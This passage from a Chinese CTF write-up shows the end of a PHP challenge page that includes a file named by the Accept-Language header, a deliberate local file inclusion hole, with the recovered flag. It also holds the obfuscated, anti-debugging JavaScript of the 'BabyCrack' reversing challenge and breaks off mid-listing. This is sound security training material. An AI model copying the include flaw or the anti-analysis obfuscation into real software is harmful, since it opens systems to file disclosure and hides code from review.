class="variable">$l</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;;&quot;</span>, <span class="variable">$lang</span>)[<span class="number">0</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;p<span class="meta">&lt;?=</span>(<span class="variable">$l</span>===<span class="string">&#x27;he&#x27;</span>)?<span class="string">&quot; class=rtl&quot;</span>:<span class="string">&quot;&quot;</span><span class="meta">?&gt;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">include</span> <span class="string">&quot;<span class="subst">$dir</span>/<span class="subst">$l</span>.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/p&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>最后包含 flag.php 获取 flag：<code>flag&#123;i_f0und_SiMp13_LFI_gogogo&#125;</code></p><h1 id="BabyCrack-200"><a href="#BabyCrack-200" class="headerlink" title="BabyCrack(200)"></a>BabyCrack(200)</h1><p>类似 FxxkingBackdoor，是 JavaScript 的反混淆，给一个输入需要符合一定条件才会得到 flag，而整个解密输入的逻辑都在一个 js 文件中，在网页源码里拿到最开始的源码 =_=.js 如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x180a=[<span class="string">&#x27;random&#x27;</span>,<span class="string">&#x27;charCodeAt&#x27;</span>,<span class="string">&#x27;fromCharCode&#x27;</span>,<span class="string">&#x27;parse&#x27;</span>,<span class="string">&#x27;substr&#x27;</span>,<span class="string">&#x27;\x5cw+&#x27;</span>,<span class="string">&#x27;replace&#x27;</span>,<span class="string">&#x27;(3()&#123;(3\x20a()&#123;7&#123;(3\x20b(2)&#123;9((\x27\x27+(2/2)).5!==1||2%g===0)&#123;(3()&#123;&#125;).8(\x274\x27)()&#125;c&#123;4&#125;b(++2)&#125;)(0)&#125;d(e)&#123;f(a,6)&#125;&#125;)()&#125;)();&#x27;</span>,<span class="string">&#x27;||i|function|debugger|length|5000|try|constructor|if|||else|catch||setTimeout|20&#x27;</span>,<span class="string">&#x27;pop&#x27;</span>,<span class="string">&#x27;length&#x27;</span>,<span class="string">&#x27;join&#x27;</span>,<span class="string">&#x27;getElementById&#x27;</span>,<span class="string">&#x27;message&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;Welcome\x20to\x20HCTF:&gt;&#x27;</span>,<span class="string">&#x27;Congratulations!\x20you\x20got\x20it!&#x27;</span>,<span class="string">&#x27;Sorry,\x20you\x20are\x20wrong...&#x27;</span>,<span class="string">&#x27;window.console.clear();window.console.log(\x27Welcome\x20to\x20HCTF\x20:&gt;\x27)&#x27;</span>,<span class="string">&#x27;version&#x27;</span>,<span class="string">&#x27;error&#x27;</span>,<span class="string">&#x27;download&#x27;</span>,<span class="string">&#x27;substring&#x27;</span>,<span class="string">&#x27;push&#x27;</span>,<span class="string">&#x27;Function&#x27;</span>,<span class="string">&#x27;charAt&#x27;</span>,<span class="string">&#x27;idle&#x27;</span>,<span class="string">&#x27;pyW5F1U43VI&#x27;</span>,<span class="string">&#x27;init&#x27;</span>,<span class="string">&#x27;https://the-extension.com&#x27;</span>,<span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;storage&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;then&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;getTime&#x27;</span>,<span class="string">&#x27;setUTCHours&#x27;</span>,<span class="string">&#x27;origin&#x27;</span>,<span class="string">&#x27;set&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;loading&#x27;</span>,<span class="string">&#x27;status&#x27;</span>,<span class="string">&#x27;removeListener&#x27;</span>,<span class="string">&#x27;onUpdated&#x27;</span>,<span class="string">&#x27;callee&#x27;</span>,<span class="string">&#x27;addListener&#x27;</span>,<span class="string">&#x27;onMessage&#x27;</span>,<span class="string">&#x27;runtime&#x27;</span>,<span class="string">&#x27;executeScript&#x27;</span>,<span class="string">&#x27;data&#x27;</span>,<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;http://&#x27;</span>,<span class="string">&#x27;Url\x20error&#x27;</span>,<span class="string">&#x27;query&#x27;</span>,<span class="string">&#x27;filter&#x27;</span>,<span class="string">&#x27;active&#x27;</span>,<span class="string">&#x27;floor&#x27;</span>];(<span class="keyword">function</span>(<span class="params">_0xd4b7d6,_0xad25ab</span>)&#123;<span class="keyword">var</span> _0x5e3956=<span class="keyword">function</span>(<span class="params">_0x1661d3</span>)&#123;<span class="keyword">while</span>(--_0x1661d3)&#123;_0xd4b7d6[<span class="string">&#x27;push&#x27;</span>](_0xd4b7d6[<span class="string">&#x27;shift&#x27;</span>]());&#125;&#125;;<span class="title function_">_0x5e3956</span>(++_0xad25ab);&#125;(_0x180a,<span class="number">0x1a2</span>));<span class="keyword">var</span> _0xa180=<span class="keyword">function</span>(<span class="params">_0x5c351c,_0x2046d8</span>)&#123;_0x5c351c=_0x5c351c-<span class="number">0x0</span>;<span class="keyword">var</span> _0x26f3b3=_0x180a[_0x5c351c];<span class="keyword">return</span> _0x26f3b3;&#125;;<span class="keyword">function</span> <span class="title function_">check</span>(<span class="params">_0x5b7c0c</span>)&#123;<span class="keyword">try</span>&#123;<span class="keyword">var</span> _0x2e2f8d=[<span class="string">&#x27;code&#x27;</span>,<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x0&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2&#x27;</span>),<span class="string">&#x27;invalidMonetizationCode&#x27;</span>,<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x3&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x4&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x5&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x6&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x7&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x8&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x9&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0xa&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0xb&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0xc&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0xd&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0xe&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0xf&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x10&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x11&#x27;</span>),<span class="string">&#x27;url&#x27;</span>,<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x12&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x13&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x14&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x15&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x16&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x17&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x18&#x27;</span>),<span class="string">&#x27;tabs&#x27;</span>,<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x19&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1a&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1b&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1c&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1d&#x27;</span>),<span class="string">&#x27;replace&#x27;</span>,<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1e&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1f&#x27;</span>),<span class="string">&#x27;includes&#x27;</span>,<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x20&#x27;</span>),<span class="string">&#x27;length&#x27;</span>,<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x21&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x22&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x23&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x24&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x25&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x26&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x27&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x28&#x27;</span>),<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x29&#x27;</span>),<span class="string">&#x27;toString&#x27;</span>,<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2a&#x27;</span>),<span class="string">&#x27;split&#x27;</span>];<span class="keyword">var</span> _0x50559f=_0x5b7c0c[_0x2e2f8d[<span class="number">0x5</span>]](<span class="number">0x0</span>,<span class="number">0x4</span>);<span class="keyword">var</span> _0x5cea12=<span class="built_in">parseInt</span>(<span class="title function_">btoa</span>(_0x50559f),<span class="number">0x20</span>);<span class="built_in">eval</span>(<span class="keyword">function</span>(<span class="params">_0x200db2,_0x177f13,_0x46da6f,_0x802d91,_0x2d59cf,_0x2829f2</span>)&#123;_0x2d59cf=<span class="keyword">function</span>(<span class="params">_0x4be75f</span>)&#123;<span class="keyword">return</span> _0x4be75f[<span class="string">&#x27;toString&#x27;</span>](_0x177f13);&#125;;<span class="keyword">if</span>(!<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/^/</span>,<span class="title class_">String</span>))&#123;<span class="keyword">while</span>(_0x46da6f--)_0x2829f2[<span class="title function_">_0x2d59cf</span>(_0x46da6f)]=_0x802d91[_0x46da6f]||<span class="title function_">_0x2d59cf</span>(_0x46da6f);_0x802d91=[<span class="keyword">function</span>(<span class="params">_0x5e8f1a</span>)&#123;<span class="keyword">return</span> _0x2829f2[_0x5e8f1a];&#125;];_0x2d59cf=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">return</span> <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2b&#x27;</span>);&#125;;_0x46da6f=<span class="number">0x1</span>;&#125;;<span class="keyword">while</span>(_0x46da6f--)<span class="keyword">if</span>(_0x802d91[_0x46da6f])_0x200db2=_0x200db2[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2c&#x27;</span>)](<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&#x27;\x5cb&#x27;</span>+<span class="title function_">_0x2d59cf</span>(_0x46da6f)+<span class="string">&#x27;\x5cb&#x27;</span>,<span class="string">&#x27;g&#x27;</span>),_0x802d91[_0x46da6f]);<span class="keyword">return</span> _0x200db2;&#125;(<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2d&#x27;</span>),<span class="number">0x11</span>,<span class="number">0x11</span>,<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2e&#x27;</span>)[<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;|&#x27;</span>),<span class="number">0x0</span>,&#123;&#125;));(<span class="keyword">function</span>(<span class="params">_0x3291b7,_0xced890</span>)&#123;<span class="keyword">var</span> _0xaed809=<span class="keyword">function</span>(<span class="params">_0x3aba26</span>)&#123;<span class="keyword">while</span>(--_0x3aba26)&#123;_0x3291b7[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x4&#x27;</span>)](_0x3291b7[<span class="string">&#x27;shift&#x27;</span>]());&#125;&#125;;<span class="title function_">_0xaed809</span>(++_0xced890);&#125;(_0x2e2f8d,_0x5cea12%<span class="number">0x7b</span>));<span class="keyword">var</span> _0x43c8d1=<span class="keyword">function</span>(<span class="params">_0x3120e0</span>)&#123;<span class="keyword">var</span> _0x3120e0=<span class="built_in">parseInt</span>(_0x3120e0,<span class="number">0x10</span>);<span class="keyword">var</span> _0x3a882f=_0x2e2f8d[_0x3120e0];<span class="keyword">return</span> _0x3a882f;&#125;;<span class="keyword">var</span> _0x1c3854=<span class="keyword">function</span>(<span class="params">_0x52ba71</span>)&#123;<span class="keyword">var</span> _0x52b956=<span class="string">&#x27;0x&#x27;</span>;<span class="keyword">for</span>(<span class="keyword">var</span> _0x59c050=<span class="number">0x0</span>;_0x59c050&lt;_0x52ba71[<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)];_0x59c050++)&#123;_0x52b956+=_0x52ba71[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x59c050)[<span class="title function_">_0x43c8d1</span>(<span class="number">0xc</span>)](<span class="number">0x10</span>);&#125;<span class="keyword">return</span> _0x52b956;&#125;;<span class="keyword">var</span> _0x76e1e8=_0x5b7c0c[<span class="title function_">_0x43c8d1</span>(<span class="number">0xe</span>)](<span class="string">&#x27;_&#x27;</span>);<span class="keyword">var</span> _0x34f55b=(<span class="title function_">_0x1c3854</span>(_0x76e1e8[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](-<span class="number">0x2</span>,<span class="number">0x2</span>))^<span class="title function_">_0x1c3854</span>(_0x76e1e8[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x4</span>,<span class="number">0x1</span>)))%_0x76e1e8[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)]==<span class="number">0x5</span>;<span class="keyword">if</span>(!_0x34f55b)&#123;<span class="keyword">return</span>![];&#125;b2c=<span class="keyword">function</span>(<span class="params">_0x3f9bc5</span>)&#123;<span class="keyword">var</span> _0x3c3bd8=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&#x27;</span>;<span class="keyword">var</span> _0x4dc510=[];<span class="keyword">var</span> _0x4a199f=<span class="title class_">Math</span>[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x25&#x27;</span>)](_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)]/<span class="number">0x5</span>);<span class="keyword">var</span> _0x4ee491=_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)]%<span class="number">0x5</span>;<span class="keyword">if</span>(_0x4ee491!=<span class="number">0x0</span>)&#123;<span class="keyword">for</span>(<span class="keyword">var</span> _0x1e1753=<span class="number">0x0</span>;_0x1e1753&lt;<span class="number">0x5</span>-_0x4ee491;_0x1e1753++)&#123;_0x3f9bc5+=<span class="string">&#x27;&#x27;</span>;&#125;_0x4a199f+=<span class="number">0x1</span>;&#125;<span class="keyword">for</span>(_0x1e1753=<span class="number">0x0</span>;_0x1e1753&lt;_0x4a199f;_0x1e1753++)&#123;_0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)](_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>)&gt;&gt;<span class="number">0x3</span>));_0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>)&amp;<span class="number">0x7</span>)&lt;&lt;<span class="number">0x2</span>|_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x1</span>)&gt;&gt;<span class="number">0x6</span>));_0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x1</span>)&amp;<span class="number">0x3f</span>)&gt;&gt;<span class="number">0x1</span>));_0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x1</span>)&amp;<span class="number">0x1</span>)&lt;&lt;<span class="number">0x4</span>|_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x2</span>)&gt;&gt;<span class="number">0x4</span>));_0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x2</span>)&amp;<span class="number">0xf</span>)&lt;&lt;<span class="number">0x1</span>|_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x3</span>)&gt;&gt;<span class="number">0x7</span>));_0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x3</span>)&amp;<span class="number">0x7f</span>)&gt;&gt;<span class="number">0x2</span>));_0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x3</span>)&amp;<span class="number">0x3</span>)&lt;&lt;<span class="number">0x3</span>|_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x4</span>)&gt;&gt;<span class="number">0x5</span>));_0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)](_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753*<span class="number">0x5</span>+<span class="number">0x4</span>)&amp;<span class="number">0x1f</span>));&#125;<span class="keyword">var</span> _0x545c12=<span class="number">0x0</span>;<span class="keyword">if</span>(_0x4ee491==<span class="number">0x1</span>)_0x545c12=<span class="number">0x6</span>;<span class="keyword">else</span> <span class="keyword">if</span>(_0x4ee491==<span class="number">0x2</span>)_0x545c12=<span class="number">0x4</span>;<span class="keyword">else</span> <span class="keyword">if</span>(_0x4ee491==<span class="number">0x3</span>)_0x545c12=<span class="number">0x3</span>;<span class="keyword">else</span> <span class="keyword">if</span>(_0x4ee491==<span class="number">0x4</span>)_0x545c12=<span class="number">0x1</span>;<span class="keyword">for</span>(_0x1e1753=<span class="number">0x0</span>;_0x1e1753&lt;_0x545c12;_0x1e1753++)_0x4dc510[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2f&#x27;</span>)]();<span class="keyword">for</span>(_0x1e1753=<span class="number">0x0</span>;_0x1e1753&lt;_0x545c12;_0x1e1753++)_0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](<span class="string">&#x27;=&#x27;</span>);(<span class="keyword">function</span>(<span class="params"></span>)&#123;(<span class="keyword">function</span> <span class="title function_">_0x3c3bd8</span>(<span class="params"></span>)&#123;<span class="keyword">try</span>&#123;(<span class="keyword">function</span> <span class="title function_">_0x4dc510</span>(<span class="params">_0x460a91</span>)&#123;<span class="keyword">if</span>((<span class="string">&#x27;&#x27;</span>+_0x460a91/_0x460a91)[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x30&#x27;</span>)]!==<span class="number">0x1</span>||_0x460a91%<span class="number">0x14</span>===<span class="number">0x0</span>)&#123;(<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;[<span class="string">&#x27;constructor&#x27;</span>](<span class="string">&#x27;debugger&#x27;</span>)());&#125;<span class="keyword">else</span>&#123;<span class="keyword">debugger</span>;&#125;<span class="title function_">_0x4dc510</span>(++_0x460a91);&#125;(<span class="number">0x0</span>));&#125;<span class="keyword">catch</span>(_0x30f185)&#123;<span class="built_in">setTimeout</span>(_0x3c3bd8,<span class="number">0x1388</span>);&#125;&#125;());&#125;());<span class="keyword">return</span> _0x4dc510[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x31&#x27;</span>)](<span class="string">&#x27;&#x27;</span>);&#125;;e=<span class="title function_">_0x1c3854</span>(<span class="title function_">b2c</span>(_0x76e1e8[<span class="number">0x2</span>])[<span class="title function_">_0x43c8d1</span>(<span class="number">0xe</span>)](<span class="string">&#x27;=&#x27;</span>)[<span class="number">0x0</span>])^<span class="number">0x53a3f32</span>;<span class="keyword">if</span>(e!=<span class="number">0x4b7c0a73</span>)&#123;<span class="keyword">return</span>![];&#125;f=<span class="title function_">_0x1c3854</span>(<span class="title function_">b2c</span>(_0x76e1e8[<span class="number">0x3</span>])[<span class="title function_">_0x43c8d1</span>(<span class="number">0xe</span>)](<span class="string">&#x27;=&#x27;</span>)[<span class="number">0x0</span>])^e;<span class="keyword">if</span>(f!=<span class="number">0x4315332</span>)&#123;<span class="keyword">return</span>![];&#125;n=f*e*_0x76e1e8[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)];h=<span class="keyword">function</span>(<span class="params">_0x4c466e,_0x28871</span>)&#123;<span class="keyword">var</span> _0x3ea581=<span class="string">&#x27;&#x27;</span>;<span class="keyword">for</span>(<span class="keyword">var</span> _0x2fbf7a=<span class="number">0x0</span>;_0x2fbf7a&lt;_0x4c466e[<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)];_0x2fbf7a++)&#123;_0x3ea581+=<span class="title function_">_0x28871</span>(_0x4c466e[_0x2fbf7a]);&#125;<span class="keyword">return</span> _0x3ea581;&#125;;j=_0x76e1e8[<span class="number">0x1</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xe</span>)](<span class="string">&#x27;3&#x27;</span>);<span class="keyword">if</span>(j[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)]!=j[<span class="number">0x1</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)]||(<span class="title function_">_0x1c3854</span>(j[<span class="number">0x0</span>])^<span class="title function_">_0x1c3854</span>(j[<span class="number">0x1</span>]))!=<span class="number">0x1613</span>)&#123;<span class="keyword">return</span>![];&#125;k=<span class="function"><span class="params">_0xffcc52</span>=&gt;</span>_0xffcc52[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)]()*_0x76e1e8[<span class="number">0x1</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)];l=<span class="title function_">h</span>(j[<span class="number">0x0</span>],k);<span class="keyword">if</span>(l!=<span class="number">0x2f9b5072</span>)&#123;<span class="keyword">return</span>![];&#125;m=<span class="title function_">_0x1c3854</span>(_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x0</span>,<span class="number">0x4</span>))-<span class="number">0x48a05362</span>==n%l;<span class="keyword">function</span> <span class="title function_">_0x5a6d56</span>(<span class="params">_0x5a25ab,_0x4a4483</span>)&#123;<span class="keyword">var</span> _0x55b09f=<span class="string">&#x27;&#x27;</span>;<span class="keyword">for</span>(<span class="keyword">var</span> _0x508ace=<span class="number">0x0</span>;_0x508ace&lt;_0x4a4483;_0x508ace++)&#123;_0x55b09f+=_0x5a25ab;&#125;<span class="keyword">return</span> _0x55b09f;&#125;<span class="keyword">if</span>(!m||<span class="title function_">_0x5a6d56</span>(_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x5</span>,<span class="number">0x1</span>),<span class="number">0x2</span>)==_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](-<span class="number">0x5</span>,<span class="number">0x4</span>)||_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](-<span class="number">0x2</span>,<span class="number">0x1</span>)-_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x4</span>,<span class="number">0x1</span>)!=<span class="number">0x1</span>)&#123;<span class="keyword">return</span>![];&#125;o=<span class="title function_">_0x1c3854</span>(_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x6</span>,<span class="number">0x2</span>))[<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x2</span>)==_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x6</span>,<span class="number">0x1</span>)[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)]()*_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)]*<span class="number">0x5</span>;<span class="keyword">return</span> o&amp;&amp;_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x4</span>,<span class="number">0x1</span>)==<span class="number">0x2</span>&amp;&amp;_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x6</span>,<span class="number">0x2</span>)==<span class="title function_">_0x5a6d56</span>(_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x7</span>,<span class="number">0x1</span>),<span class="number">0x2</span>);&#125;<span class="keyword">catch</span>(_0x4cbb89)&#123;<span class="variable language_">console</span>[<span class="string">&#x27;log&#x27;</span>](<span class="string">&#x27;gg&#x27;</span>);<span class="keyword">return</span>![];&#125;&#125;<span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x5bf136=<span class="variable language_">document</span>[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x32&#x27;</span>)](<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x33&#x27;</span>))[<span class="string">&#x27;value&#x27;</span>];<span class="keyword">if</span>(_0x5bf136==<span class="string">&#x27;&#x27;</span>)&#123;<span class="variable language_">console</span>[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x34&#x27;</span>)](<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x35&#x27;</span>));<span class="keyword">return</span>![];&#125;<span class="keyword">var</span> _0x4d0e29=<span class="title function_">check</span>(_0x5bf136);<span class="keyword">if</span>(_0x4d0e29)&#123;<span class="title function_">alert</span>(<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x36&#x27;</span>));&#125;<span class="keyword">else</span>&#123;<span class="title function_">alert</span>(<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x37&#x27;</span>));&#125;&#125;<span class="variable language_">window</span>[<span class="string">&#x27;onload&#x27;</span>]=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="built_in">setInterval</span>(<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x38&#x27;</span>),<span class="number">0x32</span>);<span class="title function_">test</span>();&#125;;</span><br></pre></td></tr></table></figure><p>美化一下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 